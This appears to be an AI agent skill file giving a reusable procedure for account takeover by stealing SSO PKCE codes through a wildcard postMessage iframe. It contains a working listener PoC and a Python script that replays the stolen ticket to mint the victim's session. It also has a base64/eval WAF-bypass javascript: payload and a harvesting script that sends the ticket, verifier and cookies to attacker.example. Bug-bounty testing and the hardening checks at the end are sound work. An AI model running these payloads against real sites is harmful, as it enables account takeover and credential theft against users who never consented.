---
name: sso-postmessage-pkce
description: SSO iframe + wildcard postMessage auth-code/PKCE theft → full account takeover. Use when testing any web application that uses an iframe-based single sign-on (SSO) flow with postMessage (cross-origin identifier provider, login-iframe endpoint, silent SSO, PKCE code flow). Also applies to any client-side open-redirect sink that might accept a javascript: URI (DOM XSS) and to SSO artifacts exposed via postMessage targetOrigin "*". Triggers on: "SSO", "iframe postMessage", "silent login", "PKCE codeVerifier", "login-iframe", "set-cookie with ticket+verifier", cross-origin auth handshake, or a redirect parameter worth checking for DOM XSS.
---

# SSO iframe + wildcard postMessage PKCE theft → Full Account Takeover

A one-click full account takeover that starts as a low-severity open redirect and
ends with mintage of the victim's session cookie on your side, without ever
touching an HttpOnly cookie. This write-up is the reusable procedure from a real
4-hour chain and the simpler cross-origin variant that was the *actual* bug.

## The core idea

Many SSO flows do the cross-origin auth handshake like this:

1. The **portal** (MyApp) embeds an **iframe** pointing at a `/login-iframe?fromLocation=...`
   endpoint (also on MyApp, or on the identity provider).
2. The iframe loads an SDK that talks to the **IdP** (separate origin).
3. The IdP returns a one-shot artifact — often a **PKCE pair `{ticket, codeVerifier}`**.
4. The iframe forwards it to its parent via:
   ```js
   window.parent.postMessage({ channel: 'sdk-login-status', data }, "*")
   ```
5. The parent takes the pair and exchanges it (e.g. `POST /set-cookie`) to mint the
   **opkey**/session cookie.

**The bug is the `"*"` target origin in step 4, on an iframe endpoint that has no
`X-Frame-Options` / `X-Frame-Options: DENY` / CSP `frame-ancestors`.** Anyone who
embeds that iframe is `window.parent`. The browser delivers the postMessage to you
regardless of your origin. You receive a **fresh, unburned PKCE pair** minted
against the *victim's* still-valid IdP session (silent SSO, no user interaction).

## Two-stage checklist (test these FIRST on any SSO)

1. **Is the login-iframe endpoint frameable?**
   ```bash
   curl -sI 'https://<target>/user/web-sso/login-iframe?fromLocation=/'
   ```
   Look for missing `X-Frame-Options` and missing CSP `frame-ancestors`.
2. **Does it postMessage auth artifacts to a wildcard target?**
   Grep the page JS (Sources → Ctrl+Shift+F on the parameter, or the Network
   tab **Initiator** column) for:
   ```js
   window.parent.postMessage(..., "*")
   ```
   and verify the `data` payload includes a `ticket` / `codeVerifier` (or any
   artifact that can be exchanged for a session).

If both are true, you have a **cross-origin postMessage auth-theft** — no XSS needed.
Host the PoC on a domain you own, embed the iframe, capture the message, replay.

## Cross-origin PoC (the simplest, highest-value test)

Works in any browser. Host on a domain you control. Victim is signed into the IdP.

```html
<!DOCTYPE html>
<html>
<head><title>postMessage PoC</title></head>
<body>
<h2>postMessage Listener</h2>
<pre id="log" style="background:#111;color:#0f0;padding:16px;white-space:pre-wrap"></pre>
<iframe id="target" width="600" height="700"
  src="https://<target>/user/web-sso/login-iframe?fromLocation="
  style="border:2px solid red"></iframe>
<script>
var logEl = document.getElementById('log');
function log(m){ logEl.textContent += m + '\n'; }
window.addEventListener('message', function(event){
  log('origin: ' + event.origin);
  log('data:   ' + JSON.stringify(event.data, null, 2));
});
log('Waiting for postMessage from iframe...');
</script>
</body>
</html>
```

If you see `{ticket, codeVerifier}` (or equivalent) with a non-empty payload →
the IdP session is leaking. Proceed to replay.

## Replaying the stolen pair (mint the victim's session)

The pair came from the victim's silent SSO inside *your* iframe, so it is fresh and
unburned. Replay with the same session that called generate-token / set-cookie so
the `state` matches:

```python
import requests, sys
ticket, verifier = sys.argv[1], sys.argv[2]
s = requests.Session()
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Origin':     'https://<target>',
    'Referer':    'https://<target>/user/web-sso/login',
    'X-Requested-With': 'XMLHttpRequest',
})
state = s.post('https://<target>/user/web-sso/generate-token').json()['data']['token']
r = s.post('https://<target>/user/web-sso/set-cookie', data={
    'ticket': ticket, 'codeVerifier': verifier, 'state': state,
})
# s now holds opkey for the victim's account -> impersonate: GET /user/profile
print(s.get('https://<target>/user/profile?devType=1').text)
```

Full ATO. The server mints the victim's `opkey` into `s`.

## When the iframe/postMessage isn't exposed cross-origin (the XSS chain)

Used when the SSO iframe rejects foreign parents (frame-busting) or you cannot host
external. Then need the victim ON the target origin — via a **client-side open
redirect → DOM XSS** chain.

**Key rule: a client-side redirect sink is NOT the same as a server-side
`Location:` redirect.** `location.href = javascript:...` in JS executes the URI
(server `Location:` headers refuse `javascript:`). So test every SPA redirect
parameter (e.g. `fromLocation=`, `returnTo=`, `next=`) for a `javascript:` URI.

- **WAF bypass** for `javascript:alert(1)`: the WAF blocklist typically matches
  literal `alert(` / `eval(` substrings. Bracket access + base64 indirection get
  past it:
  ```javascript
  javascript:window['eval'](window['atob']('ZmV0Y2go...'))
  ```
  where the base64 decodes to an external loader:
  ```js
  fetch("https://attacker.example/p.js").then(r=>r["text"]()).then(e=>(0,eval)(e))
  ```
  Keep the URL small; host the exploit body separately.

- **Timing axis**: a passive `message` listener or even hooking `window.fetch` is
  *too late* when the sink fires at the END of the success callback (the legit
  parent has already burned the PKCE pair by then). Don't fight the timing — **run
  your own parallel copy of the flow** (see below).

## Parallel-flow harvesting payload (for the on-origin XSS variant)

`p.js` executed inside the XSS: spawns its own hidden login-iframe so the pair is
generated fresh and *never* burned by a competing parent, then exfils:

```js
const f = document.createElement('iframe');
f.style.display = 'none';
f.src = '/user/web-sso/login-iframe?fromLocation=/';
document.body.appendChild(f);
window.addEventListener('message', e => {
  if (e.source !== f.contentWindow) return;   // only our iframe
  const d = e.data;
  if (d?.channel === 'sdk-login-status' && d.data?.code === 'loginSuccess') {
    navigator.sendBeacon('https://attacker.example/collect', JSON.stringify({
      ticket: d.data.ticket, verifier: d.data.codeVerifier, cookies: document.cookie,
    }));
  }
});
```

`e.source !== f.contentWindow` filters out the legit iframe's message; `sendBeacon`
survives navigation. Then replay with the same Python script.

## Reporting: pick the right finding

- **Higher value** (if frameable + `"*"`): report the **postMessage / cross-origin
  auth-artifact disclosure** as its own finding — it's a one-click ATO with no
  chained component. Cite the missing frame-busting header + `"*"` target origin.
- If the program already closed a similar report, ask which report matched and
  whether the *caller-controlled iframe embedding an auth-artifact-leaking
  endpoint* variant was covered — do not let a full ATO be silently absorbed into
  an unrelated low.

## Hardening check (what to look for to call something safe)
- `X-Frame-Options: DENY` / `SAMEORIGIN` or CSP `frame-ancestors` on the iframe endpoint → not frameable → chain dead at step 1.
- `postMessage` uses a **literal target origin** (not `"*"`) → browser only delivers to that origin → safe.
- Receiver checks `event.origin` against an allowlist → safe.
- Artifact is single-use AND redeemed only by a server the attacker can't drive → safer.

## Gotchas / notes from the field
- The three characters `"*"` are the whole bug; a literal-origin `postMessage` closes it at the browser layer with no server change.
- If a client-side redirect is present, always spend the `javascript:` URI test before reporting it as "just an open redirect" — the DOM-XSS escalation is what makes it reportable.
- The "side observation" you note while building a chain is frequently the real, simpler bug. (Here: the wildcard postMessage.)
- Read the page JS even when the visible bug is trivial — one hour of reading produced a working ATO chain.
